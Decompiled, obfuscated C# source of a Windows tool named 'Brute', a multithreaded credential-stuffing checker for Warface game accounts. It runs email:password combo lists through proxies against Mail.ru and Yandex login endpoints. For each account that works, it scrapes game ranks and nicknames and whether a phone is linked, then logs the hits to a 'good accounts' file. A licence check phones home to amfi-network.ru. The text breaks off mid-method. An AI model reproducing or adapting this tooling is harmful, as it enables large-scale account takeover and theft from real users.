using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using xNet.Net;

namespace Brute
{
	// Token: 0x02000005 RID: 5
	public partial class MainForm : Form
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x0600001D RID: 29 RVA: 0x00003278 File Offset: 0x00001478
		private string CurrentDirectory
		{
			get
			{
				return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003298 File Offset: 0x00001498
		public MainForm(string skype)
		{
			MainForm.form = this;
			this.UKTIRICDUCEMTCWJRILKGQ = skype;
			this.WIEJGVHHEYJZGUIQOTUPS();
			if (MainForm.ARNRGTXXRXIOCRSGXYDEIU == null)
			{
				MainForm.ARNRGTXXRXIOCRSGXYDEIU = new ThreadExceptionEventHandler(MainForm.QWYKZUOZPQOGTTUNWUDTQO);
			}
			Application.ThreadException += MainForm.ARNRGTXXRXIOCRSGXYDEIU;
			AppDomain.CurrentDomain.UnhandledException += this.SVVLIJQURVTQWWGINEHSR;
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Interval = 3000.0;
			System.Timers.Timer timer2 = timer;
			if (MainForm.PRJCEOBUXXXIEQHCPEBOBN == null)
			{
				MainForm.PRJCEOBUXXXIEQHCPEBOBN = new ElapsedEventHandler(MainForm.TXZTNPDPIYGWAQNOKULZOV);
			}
			timer2.Elapsed += MainForm.PRJCEOBUXXXIEQHCPEBOBN;
			timer.Start();
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003374 File Offset: 0x00001574
		private void WIEJGVHHEYJZGUIQOTUPS()
		{
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003384 File Offset: 0x00001584
		public static void AntiS()
		{
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003394 File Offset: 0x00001594
		private string ZQHQFRTHUYHCOJRGLEMVOH(string ZESWUMIEEUPAATVDXHTWZM, int JOGZDUYKGBDGZHHZHASRG)
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(ZESWUMIEEUPAATVDXHTWZM, JOGZDUYKGBDGZHHZHASRG);
			string result = tcpClient.Client.RemoteEndPoint.ToString().Replace(":" + JOGZDUYKGBDGZHHZHASRG, string.Empty);
			tcpClient.Close();
			return result;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000033E4 File Offset: 0x000015E4
		private void IUXJXJXMPQBYYEDJDRSAIP()
		{
			Thread.Sleep(TimeSpan.FromMinutes(5.0));
			try
			{
				string b = this.ZQHQFRTHUYHCOJRGLEMVOH("amfi-network.ru", 80);
				string a = this.ZQHQFRTHUYHCOJRGLEMVOH("winmskhost2.ispserver.com", 443);
				if (a != b)
				{
					Environment.Exit(0);
				}
				string text = MainForm.FDDXMTRZEPLCDBPQYBMSMH(256);
				HttpRequest httpRequest = new HttpRequest();
				httpRequest.AddHeader("User-Agent", "WarFaceLic/1.0");
				httpRequest.AddParam("k", Auth.GetHwid());
				httpRequest.AddParam("d", text);
				httpRequest.AddParam("s", this.UKTIRICDUCEMTCWJRILKGQ);
				HttpResponse httpResponse = httpRequest.Post("http://amfi-network.ru/warface/CheckLic.aspx");
				string text2 = httpResponse.ToString();
				if (!httpResponse.Headers.ContainsKey("Status") || !httpResponse.Headers.ContainsKey("X-Powered-By"))
				{
					Environment.Exit(0);
				}
				text2 = MainForm.IXJWWHOQSOBNKBHBQFHDUQ(text2, text, 256);
				IEnumerable<char> source = text2;
				if (MainForm.ENHWKAZBIGSRZSXUJRHFPZ == null)
				{
					MainForm.ENHWKAZBIGSRZSXUJRHFPZ = new Func<char, char>(MainForm.ZOAEMWHWVHGGLQTMOPIMBQ);
				}
				string text3 = new string(source.Select(MainForm.ENHWKAZBIGSRZSXUJRHFPZ).ToArray<char>());
				if (!text3.StartsWith("GOOD"))
				{
					Environment.Exit(0);
				}
			}
			catch (Exception)
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003548 File Offset: 0x00001748
		private static string IXJWWHOQSOBNKBHBQFHDUQ(string HBPNCKUZOINEPOYKECWQWF, string AOLLXIIUSZGIWNUSASOGB, int QOZPRWPRYCHWAZDNTWTFZ)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged
			{
				KeySize = QOZPRWPRYCHWAZDNTWTFZ,
				BlockSize = 128,
				Mode = CipherMode.CBC,
				Padding = PaddingMode.PKCS7,
				IV = Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(AOLLXIIUSZGIWNUSASOGB)).Split(new char[]
				{
					','
				})[0]),
				Key = Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(AOLLXIIUSZGIWNUSASOGB)).Split(new char[]
				{
					','
				})[1])
			};
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64CharArray(HBPNCKUZOINEPOYKECWQWF.ToCharArray(), 0, HBPNCKUZOINEPOYKECWQWF.Length);
			return Encoding.UTF8.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003614 File Offset: 0x00001814
		private static string FDDXMTRZEPLCDBPQYBMSMH(int QOZPRWPRYCHWAZDNTWTFZ)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged
			{
				KeySize = QOZPRWPRYCHWAZDNTWTFZ,
				BlockSize = 128,
				Mode = CipherMode.CBC,
				Padding = PaddingMode.PKCS7
			};
			rijndaelManaged.GenerateIV();
			string str = Convert.ToBase64String(rijndaelManaged.IV);
			rijndaelManaged.GenerateKey();
			string str2 = Convert.ToBase64String(rijndaelManaged.Key);
			string s = str + "," + str2;
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003694 File Offset: 0x00001894
		private string NXXSOUWSRZGOYOYBFAOJGB(byte[] MCDMWULUIUEVCSTPWUHMXX, byte[] UGZLYTVLLYVNBQOMBXELJM, byte[] NUPTHICMAPKKYTSYOYJCAR)
		{
			if (MCDMWULUIUEVCSTPWUHMXX == null || MCDMWULUIUEVCSTPWUHMXX.Length <= 0)
			{
				throw new ArgumentNullException("cipherText");
			}
			if (UGZLYTVLLYVNBQOMBXELJM == null || UGZLYTVLLYVNBQOMBXELJM.Length <= 0)
			{
				throw new ArgumentNullException("Key");
			}
			if (NUPTHICMAPKKYTSYOYJCAR == null || NUPTHICMAPKKYTSYOYJCAR.Length <= 0)
			{
				throw new ArgumentNullException("Key");
			}
			string result = null;
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.Key = UGZLYTVLLYVNBQOMBXELJM;
				rijndaelManaged.IV = NUPTHICMAPKKYTSYOYJCAR;
				ICryptoTransform transform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV);
				using (MemoryStream memoryStream = new MemoryStream(MCDMWULUIUEVCSTPWUHMXX))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x000037B0 File Offset: 0x000019B0
		private void IKBVESFKTAAVCVPYUIIBGB()
		{
			try
			{
				HttpRequest httpRequest = new HttpRequest();
				string version = httpRequest.Get("http://amfi-network.ru/steamversion.php", null).ToString();
				Version version2 = Assembly.GetExecutingAssembly().GetName().Version;
				Version v = new Version(version);
				if (version2 < v)
				{
					new AutoUpd().ShowDialog();
					Environment.Exit(0);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003824 File Offset: 0x00001A24
		private void SVVLIJQURVTQWWGINEHSR(object sender, UnhandledExceptionEventArgs e)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(DateTime.Now.ToString());
			stringBuilder.Append(Environment.NewLine);
			stringBuilder.Append(e.ExceptionObject.ToString());
			stringBuilder.Append(Environment.NewLine);
			File.AppendAllText(Path.Combine(this.CurrentDirectory, "CriticalError.txt"), stringBuilder.ToString());
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003898 File Offset: 0x00001A98
		private void BTUBINGAUWPNNLKXWPCEMM(object sender, EventArgs e)
		{
			this.BBJDDERACAYCCLSKVCCBLU.SelectedIndex = 3;
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000038A8 File Offset: 0x00001AA8
		public void CreateThreads()
		{
			MainForm.NTCDHPGJSIOYHAEERMBKD = -1;
			MainForm.URGDLAOINTAQLSXVJCVLKF = -1;
			this.XMIPVHZLLGHBMQQWXKSWMK = true;
			this.BSXFKAGCOFUTGFLOWXAVOT = new Thread[1000];
			ZUKPFWCFAUTRSGGDNAPJX.XLSXYJVALUINBDOBRZOISC = Convert.ToInt32(this.EXPFAFSZHYJZJBVNTLEGMT.Value);
			if (ZUKPFWCFAUTRSGGDNAPJX.XLSXYJVALUINBDOBRZOISC > ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count)
			{
				ZUKPFWCFAUTRSGGDNAPJX.XLSXYJVALUINBDOBRZOISC = ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count;
				this.EXPFAFSZHYJZJBVNTLEGMT.Value = ZUKPFWCFAUTRSGGDNAPJX.XLSXYJVALUINBDOBRZOISC;
			}
			this.ZUPHFYDOEHZKLFRJXCETEJ.Enabled = false;
			this.TZCDBZWQPEWXSAMIGQJDQH.Enabled = false;
			this.AXVYBLZFVNSUDUHVIKFWEO.Enabled = false;
			this.DQTKZKBMXOLUEIXXGMHUSU.Enabled = true;
			this.EXPFAFSZHYJZJBVNTLEGMT.Enabled = false;
			this.JWTWZZOMTPYTKGIRGHHPTY.Enabled = false;
			this.BBJDDERACAYCCLSKVCCBLU.Enabled = false;
			for (int i = 0; i < ZUKPFWCFAUTRSGGDNAPJX.XLSXYJVALUINBDOBRZOISC; i++)
			{
				this.BSXFKAGCOFUTGFLOWXAVOT[i] = new Thread(new ThreadStart(this.OIEDJRHUZSJDISXJFHIQAG));
				this.BSXFKAGCOFUTGFLOWXAVOT[i].IsBackground = true;
				this.BSXFKAGCOFUTGFLOWXAVOT[i].Start();
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000039C4 File Offset: 0x00001BC4
		public void StopThreads()
		{
			this.XMIPVHZLLGHBMQQWXKSWMK = false;
			this.DQTKZKBMXOLUEIXXGMHUSU.Enabled = false;
			this.PPTVGXKHNWJMHSBSRQXRHL.Enabled = true;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000039E8 File Offset: 0x00001BE8
		public static string Pars(string strSource, string strStart, string strEnd, int startPos)
		{
			int length = strStart.Length;
			string result = "";
			int num = strSource.IndexOf(strStart, startPos, StringComparison.Ordinal);
			int num2 = strSource.IndexOf(strEnd, num + length, StringComparison.Ordinal);
			if (num != -1 & num2 != -1)
			{
				result = strSource.Substring(num + length, num2 - (num + length));
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00003A40 File Offset: 0x00001C40
		public static string Check(string login, string password, int proxyIndex)
		{
			string result;
			using (HttpRequest httpRequest = new HttpRequest())
			{
				try
				{
					CookieDictionary cookies = new CookieDictionary(false);
					string text = string.Empty;
					string str = string.Empty;
					string text2 = string.Empty;
					string text3 = string.Empty;
					string text4 = string.Empty;
					string text5 = string.Empty;
					string text6 = string.Empty;
					string text7 = login.Split(new char[]
					{
						Convert.ToChar("@")
					})[1];
					bool flag = false;
					string text8 = "";
					string text9 = "";
					string text10 = "";
					string text11 = "";
					string text12 = "";
					string text13 = "";
					int num = 3;
					int num2 = 3;
					int num3 = 3;
					bool flag2 = false;
					if (ZUKPFWCFAUTRSGGDNAPJX.IZRXIVKWPKCMTYCEAPHLCD)
					{
						httpRequest.Proxy = YYMDSDATHSFUURYHIGBFLB.UAPHGNGMPKNJUNCFETIASS(proxyIndex);
					}
					httpRequest.AllowAutoRedirect = false;
					httpRequest.Cookies = new CookieDictionary(false);
					httpRequest.UserAgent = "Downloader/4040";
					httpRequest.AddHeader("Accept", "*/*");
					httpRequest.ConnectTimeout = MainForm.VQITHZTHDIDSEALGFHUSGQ;
					if (text7 == Convert.ToString("mail.ru") || text7 == Convert.ToString("bk.ru") || text7 == Convert.ToString("list.ru") || text7 == Convert.ToString("inbox.ru") || text7 == Convert.ToString("mail.ua"))
					{
						flag2 = true;
					}
					if (text7.Contains("ya.") || text7.Contains("yandex.") || text7.Contains("narod."))
					{
						flag = true;
					}
					if (flag2)
					{
						str = Convert.ToString("client_id=gamecenter.mail.ru&grant_type=password&username=" + login + "&password=" + password);
					}
					else
					{
						str = Convert.ToString(string.Concat(new string[]
						{
							"<?xml version=\"1.0\" encoding=\"UTF-8\"?><GcAuth Username=\"",
							login,
							"\" Password=\"",
							password,
							"\" ChannelId=\"0\"/>"
						}));
					}
					int num4;
					if (flag2)
					{
						HttpResponse httpResponse = httpRequest.Post("https://o2.mail.ru/token", str, "application/x-www-form-urlencoded");
						text = httpResponse.ToString();
						num4 = 2;
						if (text.Contains("invalid username or password"))
						{
							num4 = 0;
						}
						if (text.Contains("user is blocked"))
						{
							num4 = 0;
						}
						if (text.Contains("\"access_token\":"))
						{
							num4 = 1;
							text5 = MainForm.Pars(text, "\"access_token\":\"", "\"", 0);
							if (text5 == "")
							{
								num4 = 2;
							}
						}
						if (num4 == 1)
						{
							str = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><MrPage2 SessionKey=\"" + text5 + "\" Page=\"http://dl.mail.ru/robots.txt\"/>";
							httpResponse = httpRequest.Post("https://authdl.mail.ru/ec.php?hint=MrPage2", str, "application/x-www-form-urlencoded");
							text = httpResponse.ToString();
							num4 = 2;
							if (text.Contains("<MrPage2 Location=\""))
							{
								num4 = 1;
								text2 = MainForm.Pars(text, "<MrPage2 Location=\"", "\"", 0);
								if (text2 == "")
								{
									num4 = 2;
								}
							}
						}
						if (num4 == 1)
						{
							httpRequest.ClearAllHeaders();
							text2 = text2.Replace("&amp;", "&");
							httpRequest.Get(text2, null);
							num4 = 2;
							text3 = httpRequest.Cookies["Mpop"];
							if (text3 != "")
							{
								num4 = 1;
							}
						}
					}
					else
					{
						HttpResponse httpResponse = httpRequest.Post("https://authdl.mail.ru/ec.php?hint=GcAuth", str, "application/x-www-form-urlencoded");
						text = httpResponse.ToString();
						num4 = 2;
						if (text.Contains("<GcAuth ErrorCode=\"418\"") || text.Contains("<GcAuth ErrorCode=\"411\""))
						{
							num4 = 0;
						}
						if (text.Contains("\" Token=\""))
						{
							num4 = 1;
							text5 = MainForm.Pars(text, "\" Token=\"", "\"", 0);
							if (text5 == "")
							{
								num4 = 2;
							}
						}
					}
					if (num4 == 1)
					{
						if (flag2)
						{
							str = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Auth ProjectId=\"1177\" SubProjectId=\"0\" ShardId=\"2\" Mpop=\"" + text3 + "\"/>";
						}
						else
						{
							str = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Auth ProjectId=\"1177\" SubProjectId=\"0\" ShardId=\"2\" GcToken=\"" + text5 + "\"/>";
						}
						httpRequest.UserAgent = "Downloader/4040";
						HttpResponse httpResponse = httpRequest.Post("https://authdl.mail.ru/sz.php?hint=Auth", str, "application/x-www-form-urlencoded");
						text = httpResponse.ToString();
						num4 = 2;
						if (text.Contains("Reason=\"user has no such project"))
						{
							num4 = 0;
						}
						if (text.Contains("<Auth PersId=\""))
						{
							num4 = 1;
							text4 = MainForm.Pars(text, "Auth PersId=\"", "\"", 0);
							if (text4 == "")
							{
								num4 = 2;
							}
						}
					}
					if (num4 == 1)
					{
						if (num4 == 1)
						{
							httpRequest.ClearAllHeaders();
							httpRequest.EnableAdditionalHeaders = false;
							httpRequest.AddHeader("Origin", "http://cdn.warface.ru");
							httpRequest.AddHeader("Accept-Language", "en-us,en");
							httpRequest.AddHeader("Accept-Charset", "iso-8859-1,*,utf-8");
							httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22";
							HttpResponse httpResponse = httpRequest.Get("http://wf.mail.ru/dynamic/ajax/gc.php?do=get_ladder_info_gamecenter&server=1&category=1&userid=" + text4, null);
							text = httpResponse.ToString();
							if (text.Contains("<li class=\"msg no_pers\">"))
							{
								num4 = 1;
							}
							if (text.Contains("<li class=\"selected\">"))
							{
								num4 = 3;
							}
							if (num4 == 1)
							{
								text8 = "0";
								text11 = "Персонаж не найден";
								num = 0;
							}
							if (num4 == 3)
							{
								text8 = MainForm.Pars(text, "<li class=\"selected\">", "</li>", 0);
								text11 = MainForm.Pars(text8, "<div class=\"nickname\">", "</div>", 0);
								text8 = MainForm.Pars(text8, "<div class=\"rank_icon icon_rank_", "\"></div>", 0);
								num = 1;
								num4 = 1;
							}
						}
						if (num4 == 1)
						{
							httpRequest.ClearAllHeaders();
							httpRequest.EnableAdditionalHeaders = false;
							httpRequest.AddHeader("Origin", "http://cdn.warface.ru");
							httpRequest.AddHeader("Accept-Language", "en-us,en");
							httpRequest.AddHeader("Accept-Charset", "iso-8859-1,*,utf-8");
							httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22";
							HttpResponse httpResponse = httpRequest.Get("http://wf.mail.ru/dynamic/ajax/gc.php?do=get_ladder_info_gamecenter&server=2&category=1&userid=" + text4, null);
							text = httpResponse.ToString();
							if (text.Contains("<li class=\"msg no_pers\">"))
							{
								num4 = 1;
							}
							if (text.Contains("<li class=\"selected\">"))
							{
								num4 = 3;
							}
							if (num4 == 1)
							{
								text9 = "0";
								text12 = "Персонаж не найден";
								num2 = 0;
							}
							if (num4 == 3)
							{
								text9 = MainForm.Pars(text, "<li class=\"selected\">", "</li>", 0);
								text12 = MainForm.Pars(text9, "<div class=\"nickname\">", "</div>", 0);
								text9 = MainForm.Pars(text9, "<div class=\"rank_icon icon_rank_", "\"></div>", 0);
								num2 = 1;
								num4 = 1;
							}
						}
						if (num4 == 1)
						{
							httpRequest.ClearAllHeaders();
							httpRequest.EnableAdditionalHeaders = false;
							httpRequest.AddHeader("Origin", "http://cdn.warface.ru");
							httpRequest.AddHeader("Accept-Language", "en-us,en");
							httpRequest.AddHeader("Accept-Charset", "iso-8859-1,*,utf-8");
							httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22";
							HttpResponse httpResponse = httpRequest.Get("http://wf.mail.ru/dynamic/ajax/gc.php?do=get_ladder_info_gamecenter&server=3&category=1&userid=" + text4, null);
							text = httpResponse.ToString();
							if (text.Contains("<li class=\"msg no_pers\">"))
							{
								num4 = 1;
							}
							if (text.Contains("<li class=\"selected\">"))
							{
								num4 = 3;
							}
							if (num4 == 1)
							{
								text10 = "0";
								text13 = "Персонаж не найден";
								num3 = 0;
							}
							if (num4 == 3)
							{
								text10 = MainForm.Pars(text, "<li class=\"selected\">", "</li>", 0);
								text13 = MainForm.Pars(text10, "<div class=\"nickname\">", "</div>", 0);
								text10 = MainForm.Pars(text10, "<div class=\"rank_icon icon_rank_", "\"></div>", 0);
								num3 = 1;
								num4 = 1;
							}
						}
						if (num4 == 1)
						{
							if (num == 0 && num2 == 0 && num3 == 0)
							{
								num4 = 0;
							}
							if (num == 3 && num2 == 3 && num3 == 3)
							{
								num4 = 2;
							}
							if (text8 == "" && text9 == "" && text10 == "")
							{
								num4 = 2;
							}
							if (text11 == "" && text12 == "" && text13 == "")
							{
								num4 = 2;
							}
						}
					}
					if (num4 == 1 && flag2)
					{
						httpRequest.ClearAllHeaders();
						HttpResponse httpResponse2 = httpRequest.Get("http://auth.mail.ru/cgi-bin/auth?mhost=touch.mail.ru&Login=" + login + "&Password" + password, null);
						if (httpResponse2.ContainsCookie("Mpop"))
						{
							num4 = 1;
						}
						else
						{
							num4 = 2;
						}
						if (num4 == 1)
						{
							httpRequest.ClearAllHeaders();
							string text14 = httpRequest.Get("https://e.mail.ru/settings", null).ToString();
							if (text14.Contains("<span class=\"settings__index__userinfo__name\">"))
							{
								if (text14.Contains("Телефон не указан."))
								{
									text6 = "Не привязан";
								}
								else
								{
									text6 = "Привязан";
								}
							}
							else
							{
								num4 = 2;
							}
						}
					}
					if (num4 == 1 && flag)
					{
						httpRequest.ClearAllHeaders();
						httpRequest.Cookies = cookies;
						str = string.Concat(new string[]
						{
							"login=",
							login,
							"&passwd=",
							password,
							"&twoweeks=yes"
						});
						httpRequest.AddHeader("Referer", "https://mail.yandex.ua/").AddHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4");
						HttpResponse httpResponse3 = httpRequest.Post("https://passport.yandex.ru/passport?mode=auth&from=mail&origin=hostroot_ua_reliable_nol_enter&retpath=https%3A%2F%2Fmail.yandex.ua", str, "application/x-www-form-urlencoded");
						string text15 = httpResponse3.ToString();
						if (text15.Contains("Неправильная пара логин-пароль") || text15.Contains("Необходимо ввести символы") || httpResponse3.ContainsHeader("X-Frame-Options: DENY"))
						{
							text6 = "Не удалось проверить";
						}
						if (httpRequest.Cookies.ContainsKey("yandex_login"))
						{
							num4 = 1;
						}
						if (num4 == 1)
						{
							httpRequest.Cookies = cookies;
							httpRequest.AllowAutoRedirect = true;
							httpRequest.AddHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4,uk;q=0.2");
							httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36";
							string text16 = httpRequest.Get("https://phone-passport.yandex.ru/phones", null).ToString();
							if (text16.Contains("display-name"))
							{
								text6 = MainForm.Pars(text16, "<span class=\"b-phonenumber_number\">", "</span>", 0);
								if (!string.IsNullOrWhiteSpace(text6))
								{
									text6 = "Не привязан";
								}
								else
								{
									text6 = "Привязан";
								}
							}
						}
					}
					httpRequest.ClearAllHeaders();
					httpRequest.Dispose();
					result = string.Concat(new string[]
					{
						"\"Conclusion\" = ",
						num4.ToString(),
						",Rank1=",
						text8,
						",Nick1=",
						text11,
						",,Rank2=",
						text9,
						",Nick2=",
						text12,
						",,Rank3=",
						text10,
						",Nick3=",
						text13,
						",mobile=",
						text6,
						","
					});
				}
				catch (Exception)
				{
					result = "\"Conclusion\" = 2,";
				}
			}
			return result;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00004568 File Offset: 0x00002768
		private void OIEDJRHUZSJDISXJFHIQAG()
		{
			Action action = null;
			MainForm.DTFDFZNLBHQYJLDHUSDUHP dtfdfznlbhqyjldhusduhp = new MainForm.DTFDFZNLBHQYJLDHUSDUHP();
			dtfdfznlbhqyjldhusduhp.USWUGVEWFPBKNLBCLHMZYS = this;
			bool flag = true;
			string text = "\"Conclusion\" = 2,";
			dtfdfznlbhqyjldhusduhp.RJORVGJCHKPFJBKUOZRTTG = 0;
			int proxyIndex = 0;
			string a = "NONE";
			dtfdfznlbhqyjldhusduhp.YQDNAGNJDPCSNRZFEHIOJD = "";
			dtfdfznlbhqyjldhusduhp.WNSJFLFXXGKNJQXXGILJJN = "";
			dtfdfznlbhqyjldhusduhp.TPQBSSEPKYTKTBAZCSXUPS = string.Empty;
			while (this.XMIPVHZLLGHBMQQWXKSWMK && flag)
			{
				lock (this.OJIAMLDOLZZVPADKGIMKM)
				{
					MainForm.NTCDHPGJSIOYHAEERMBKD++;
					dtfdfznlbhqyjldhusduhp.RJORVGJCHKPFJBKUOZRTTG = MainForm.NTCDHPGJSIOYHAEERMBKD;
					if (MainForm.NTCDHPGJSIOYHAEERMBKD > ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP.Count - 1)
					{
						flag = false;
					}
					else if (ZUKPFWCFAUTRSGGDNAPJX.IZRXIVKWPKCMTYCEAPHLCD & a == "NONE")
					{
						MainForm.URGDLAOINTAQLSXVJCVLKF++;
						if (MainForm.URGDLAOINTAQLSXVJCVLKF > ZUKPFWCFAUTRSGGDNAPJX.PNVITANWZWGYNKSSZJUWP.Count - 1)
						{
							MainForm.URGDLAOINTAQLSXVJCVLKF = 0;
						}
						proxyIndex = MainForm.URGDLAOINTAQLSXVJCVLKF;
					}
				}
				if (this.XMIPVHZLLGHBMQQWXKSWMK && flag)
				{
					string[] array = ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP[dtfdfznlbhqyjldhusduhp.RJORVGJCHKPFJBKUOZRTTG].ToString().Replace(';', ':').Split(new char[]
					{
						':'
					});
					text = MainForm.Check(array[0], array[1], proxyIndex);
					int num = (int)Convert.ToInt16(MainForm.Pars(text, "Conclusion\" =", ",", 0));
					dtfdfznlbhqyjldhusduhp.OWZACKOOALGDWJCSYWCWQ = MainForm.Pars(text, "Rank1=", ",", 0);
					dtfdfznlbhqyjldhusduhp.NFMVOBDRQVJLHJXTSJBAOK = MainForm.Pars(text, "Nick1=", ",", 0);
					dtfdfznlbhqyjldhusduhp.BQOEFFFQHYXVRILKKRONT = MainForm.Pars(text, "Rank2=", ",", 0);
					dtfdfznlbhqyjldhusduhp.XTVJPMBOTJTXCPHRPTLQDR = MainForm.Pars(text, "Nick2=", ",", 0);
					dtfdfznlbhqyjldhusduhp.YQDNAGNJDPCSNRZFEHIOJD = MainForm.Pars(text, "Rank3=", ",", 0);
					dtfdfznlbhqyjldhusduhp.WNSJFLFXXGKNJQXXGILJJN = MainForm.Pars(text, "Nick3=", ",", 0);
					dtfdfznlbhqyjldhusduhp.TPQBSSEPKYTKTBAZCSXUPS = MainForm.Pars(text, "mobile=", ",", 0);
					bool cpjkhppqzlusqtibnzdnft = false;
					lock (this.EHXVDMRADQMWCVYFOLAKVE)
					{
						if (num == 1)
						{
							cpjkhppqzlusqtibnzdnft = true;
							YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", "===<-Информация->===");
							YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", "Данные от аккаунта - " + ZUKPFWCFAUTRSGGDNAPJX.JNXDRBUTTZFKPXZRKJMJTP[dtfdfznlbhqyjldhusduhp.RJORVGJCHKPFJBKUOZRTTG].ToString());
							YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", "===<-Игровая статистика->===");
							if (dtfdfznlbhqyjldhusduhp.OWZACKOOALGDWJCSYWCWQ != "0")
							{
								YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", string.Concat(new string[]
								{
									"Сервер: Альфа - [Ранг - ",
									dtfdfznlbhqyjldhusduhp.OWZACKOOALGDWJCSYWCWQ,
									"|Ник - ",
									dtfdfznlbhqyjldhusduhp.NFMVOBDRQVJLHJXTSJBAOK,
									"]"
								}));
							}
							if (dtfdfznlbhqyjldhusduhp.BQOEFFFQHYXVRILKKRONT != "0")
							{
								YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", string.Concat(new string[]
								{
									"Сервер: Браво - [Ранг - ",
									dtfdfznlbhqyjldhusduhp.BQOEFFFQHYXVRILKKRONT,
									"|Ник - ",
									dtfdfznlbhqyjldhusduhp.XTVJPMBOTJTXCPHRPTLQDR,
									"]"
								}));
							}
							if (dtfdfznlbhqyjldhusduhp.YQDNAGNJDPCSNRZFEHIOJD != "0")
							{
								YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", string.Concat(new string[]
								{
									"Сервер: Чарли - [Ранг - ",
									dtfdfznlbhqyjldhusduhp.YQDNAGNJDPCSNRZFEHIOJD,
									"|Ник - ",
									dtfdfznlbhqyjldhusduhp.WNSJFLFXXGKNJQXXGILJJN,
									"]"
								}));
							}
							YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", "Привязка телефона: " + dtfdfznlbhqyjldhusduhp.TPQBSSEPKYTKTBAZCSXUPS);
							YYMDSDATHSFUURYHIGBFLB.JGEHMNSBTPIBDJFFBAMWCE("Хорошие аккаунты с логом (" + this.SCEQZFWIWCJGFRQBLZYSIS + ").txt", "===<-Информация->===\r\n");
							ZUKPFWCFAUTRSGGDNAPJX.VXMIRKXANSWHDLPJSWFFK++;
							if (action == null)
							{
								action = new Action(dtfdfznlbhqyjldhusduhp.OAQWSRYSHTVMCEHZDGPVJC);
							}
							base.Invoke(action);
							a = "GOOD PROXY";
						}
						else if (num == 0)
						{
